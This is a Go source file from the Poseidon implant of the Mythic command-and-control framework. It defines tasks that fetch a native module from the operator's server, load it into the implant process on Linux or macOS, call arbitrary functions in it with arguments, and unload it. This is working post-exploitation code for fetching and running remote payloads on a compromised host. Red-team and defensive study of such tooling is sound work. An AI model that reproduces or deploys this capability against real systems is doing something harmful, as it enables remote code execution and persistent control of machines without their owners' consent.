//go:build (linux || darwin) && (native_import || native_call || native_unload || native_module || debug)

package native_module

import (
	"encoding/json"
	"fmt"
	"sync"

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/tasks/taskRegistrar"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

type nativeModule struct {
	handle uintptr
	path   string
}

type importArguments struct {
	FileID string
}

type callArguments struct {
	FileID       string
	FunctionName string
	Args         []string
}

type unloadArguments struct {
	FileID string
}

var (
	loadedModules      = make(map[string]nativeModule)
	loadedModulesMutex sync.RWMutex
)

func init() {
	taskRegistrar.Register("native_import", RunImport)
	taskRegistrar.Register("native_call", RunCall)
	taskRegistrar.Register("native_unload", RunUnload)
}

func (e *importArguments) UnmarshalJSON(data []byte) error {
	alias := map[string]interface{}{}
	if err := json.Unmarshal(data, &alias); err != nil {
		return err
	}
	if v, ok := alias["file_id"]; ok {
		e.FileID = v.(string)
	}
	return nil
}

func (e *callArguments) UnmarshalJSON(data []byte) error {
	alias := map[string]interface{}{}
	if err := json.Unmarshal(data, &alias); err != nil {
		return err
	}
	if v, ok := alias["file_id"]; ok {
		e.FileID = v.(string)
	}
	if v, ok := alias["function_name"]; ok {
		e.FunctionName = v.(string)
	}
	if v, ok := alias["args"]; ok {
		e.Args = parseStringArray(v.([]interface{}))
	}
	return nil
}

func (e *unloadArguments) UnmarshalJSON(data []byte) error {
	alias := map[string]interface{}{}
	if err := json.Unmarshal(data, &alias); err != nil {
		return err
	}
	if v, ok := alias["file_id"]; ok {
		e.FileID = v.(string)
	}
	return nil
}

func parseStringArray(configArray []interface{}) []string {
	values := make([]string, len(configArray))
	if configArray != nil {
		for i, value := range configArray {
			values[i] = value.(string)
		}
	}
	return values
}

func RunImport(task structs.Task) {
	msg := task.NewResponse()

	args := importArguments{}
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		msg.SetError(fmt.Sprintf("Failed to unmarshal parameters: %s", err.Error()))
		task.Job.SendResponses <- msg
		return
	}
	if args.FileID == "" {
		msg.SetError("Missing file_id")
		task.Job.SendResponses <- msg
		return
	}

	loadedModulesMutex.RLock()
	_, exists := loadedModules[args.FileID]
	loadedModulesMutex.RUnlock()
	if exists {
		msg.SetError(fmt.Sprintf("Native module %s is already loaded", args.FileID))
		task.Job.SendResponses <- msg
		return
	}

	fileBytes, err := downloadFile(task, args.FileID)
	if err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}

	module, err := loadNativeModule(args.FileID, fileBytes)
	if err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}

	loadedModulesMutex.Lock()
	if _, exists = loadedModules[args.FileID]; exists {
		loadedModulesMutex.Unlock()
		_ = closeNativeModule(module)
		cleanupNativeModule(module)
		msg.SetError(fmt.Sprintf("Native module %s is already loaded", args.FileID))
		task.Job.SendResponses <- msg
		return
	}
	loadedModules[args.FileID] = module
	loadedModulesMutex.Unlock()

	msg.Completed = true
	msg.UserOutput = fmt.Sprintf("Imported native module %s", args.FileID)
	task.Job.SendResponses <- msg
}

func RunCall(task structs.Task) {
	msg := task.NewResponse()

	args := callArguments{}
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		msg.SetError(fmt.Sprintf("Failed to unmarshal parameters: %s", err.Error()))
		task.Job.SendResponses <- msg
		return
	}
	if args.FileID == "" {
		msg.SetError("Missing file_id")
		task.Job.SendResponses <- msg
		return
	}
	if args.FunctionName == "" {
		msg.SetError("Missing function_name")
		task.Job.SendResponses <- msg
		return
	}

	loadedModulesMutex.RLock()
	module, exists := loadedModules[args.FileID]
	if !exists {
		loadedModulesMutex.RUnlock()
		msg.SetError(fmt.Sprintf("Native module %s is not loaded", args.FileID))
		task.Job.SendResponses <- msg
		return
	}
	output, err := callNativeModule(module, args.FunctionName, args.Args)
	loadedModulesMutex.RUnlock()
	if err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}

	msg.Completed = true
	msg.UserOutput = output
	task.Job.SendResponses <- msg
}

func RunUnload(task structs.Task) {
	msg := task.NewResponse()

	args := unloadArguments{}
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		msg.SetError(fmt.Sprintf("Failed to unmarshal parameters: %s", err.Error()))
		task.Job.SendResponses <- msg
		return
	}
	if args.FileID == "" {
		msg.SetError("Missing file_id")
		task.Job.SendResponses <- msg
		return
	}

	loadedModulesMutex.Lock()
	module, exists := loadedModules[args.FileID]
	if !exists {
		loadedModulesMutex.Unlock()
		msg.SetError(fmt.Sprintf("Native module %s is not loaded", args.FileID))
		task.Job.SendResponses <- msg
		return
	}
	if err := closeNativeModule(module); err != nil {
		loadedModulesMutex.Unlock()
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}
	delete(loadedModules, args.FileID)
	loadedModulesMutex.Unlock()

	cleanupNativeModule(module)
	msg.Completed = true
	msg.UserOutput = fmt.Sprintf("Unloaded native module %s", args.FileID)
	task.Job.SendResponses <- msg
}

func downloadFile(task structs.Task, fileID string) ([]byte, error) {
	r := structs.GetFileFromMythicStruct{}
	r.FileID = fileID
	r.FullPath = ""
	r.Task = &task
	r.ReceivedChunkChannel = make(chan []byte)
	task.Job.GetFileFromMythic <- r

	fileBytes := make([]byte, 0)
	for {
		newBytes := <-r.ReceivedChunkChannel
		if len(newBytes) == 0 {
			break
		}
		fileBytes = append(fileBytes, newBytes...)
	}
	if len(fileBytes) == 0 {
		return nil, fmt.Errorf("Failed to get file")
	}
	return fileBytes, nil
}
